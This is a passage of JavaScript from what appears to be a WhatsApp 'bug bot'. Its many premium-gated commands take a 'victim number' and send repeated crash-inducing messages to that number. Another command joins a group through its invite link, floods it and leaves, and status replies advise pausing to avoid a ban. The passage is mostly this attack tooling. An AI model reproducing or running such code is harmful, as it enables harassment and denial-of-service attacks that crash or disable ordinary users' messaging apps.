  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "enter-engine": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "enter-uicrash": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "enter-ui": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "enter-external": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "enter-internal": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "enter-mybug": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "enter-bug": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "enter-devil": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "unex-bug": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break

case "systemuicrash": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "naruto-external": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "naruto-internal": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "internal-crash": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "crash-myinter": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "ui-grup": {
  
    if (!isPremium) return reply(mess.prem)
    if (!text) {
      return reply("*HOW TO SEND BUG TO GROUP*\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
    }
    reply("please wait, " + command + " bug is in process..");
    if (!text.split(" ")[0].includes("whatsapp.com")) {
      return reply("Link Invalid!");
    }
    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
    try {
      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
      let groupTarget = await anggazyy.groupAcceptInvite(groupLink);
      await sleep(2000); // Adjusted sleep time for clarity
      sendViewOnceMessages(groupTarget, bugAmount);
      await sleep(2500); // Adjusted sleep time for clarity
      reply("*DONEâœ… BUG HAS BEEN SENT TO THE GROUP!.*");
      anggazyy.groupLeave(groupTarget);
    } catch (error) {
      reply(util.format(error));
    }
  }
  break;
case "internal-ui": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;

case "kalahkan": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;

case "caper": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "anggazyy-external": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "anggazyy-internal": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;

case "kontol": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "bantai-dia": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "addprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285702447728`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await anggazyy.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
}
break
//=================================================//
case 'narutobug': case 'hi': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'darknees-devil': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await blackening(target, force2)
